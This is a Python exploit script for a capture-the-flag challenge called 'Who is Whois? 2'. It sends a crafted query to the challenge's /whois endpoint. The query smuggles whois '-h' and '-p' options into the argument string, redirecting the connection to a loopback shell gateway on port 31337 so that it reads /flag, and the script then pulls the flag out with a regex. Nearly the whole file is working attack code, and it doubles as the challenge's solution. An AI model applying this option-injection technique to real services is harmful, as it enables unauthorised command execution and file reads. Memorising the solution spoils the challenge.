#!/usr/bin/env python3
"""Exploit Who is Whois? 2 through WHOIS option injection."""

import argparse
import json
import re
import urllib.request


FLAG_RE = re.compile(r"THJCC\{[^\r\n}]*\}")


def run_query(base_url: str, query: str) -> dict:
    request = urllib.request.Request(
        f"{base_url.rstrip('/')}/whois",
        data=json.dumps({"query": query}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        return json.load(response)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url",
        nargs="?",
        default="http://chal.thjcc.org:5000",
        help="challenge base URL",
    )
    args = parser.parse_args()

    # The application splits this string into whois arguments. The -h and -p
    # options redirect the WHOIS connection to the loopback shell gateway.
    query = '-h 127.0.0.1 -p 31337 "/flag"'
    result = run_query(args.url, query)
    output = result.get("output", "")

    match = FLAG_RE.search(output)
    if not match:
        raise SystemExit(f"[-] flag not found in response: {output!r}")

    print(f"[+] WHOIS status: {result.get('status', 'unknown')}")
    print(f"[+] flag: {match.group(0)}")


if __name__ == "__main__":
    main()
